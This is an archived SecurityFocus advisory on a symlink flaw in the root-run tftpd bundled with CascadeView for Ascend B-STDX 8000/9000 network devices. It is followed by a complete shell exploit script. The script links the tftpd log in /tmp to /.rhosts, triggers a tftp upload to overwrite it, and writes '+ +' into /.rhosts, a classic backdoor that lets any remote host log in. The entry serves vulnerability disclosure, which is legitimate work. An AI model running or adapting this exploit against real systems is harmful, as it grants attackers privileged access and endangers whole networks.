source: http://www.securityfocus.com/bid/910/info

The tftpd bundled with CascadeView for Ascend's B-STDX 8000/9000 network devices creates a log in /tmp called tftpd_xfer_status.log. If /tmp/tftpd_xfer_status.log already exists as a symbolic link, tftpd will follow it and overwrite any data it points to (it runs as root). It is possible for an attacker to link the log file to a file like /.rhosts to compromise elevated privileges on the device. It should be made clear that since this is a network device vulnerability, the consequences of compromise could be much greater to the network the device is on as a whole than if it were a single regular host.

#!/bin/sh
#
# tftpserv.sh - Loneguard 07/03/99
#
# Buggy tftp server shipped with CascadeView B-STDX 8000/9000
#
rm /tmp/tftpd_xfer_status.log
ln -s /.rhosts /tmp/tftpd_xfer_status.log
echo KungFu > crazymonkey
( sleep 1 ; echo put crazymonkey ; sleep 1 ; echo quit ) | tftp 127.1
echo "+ +" > /.rhosts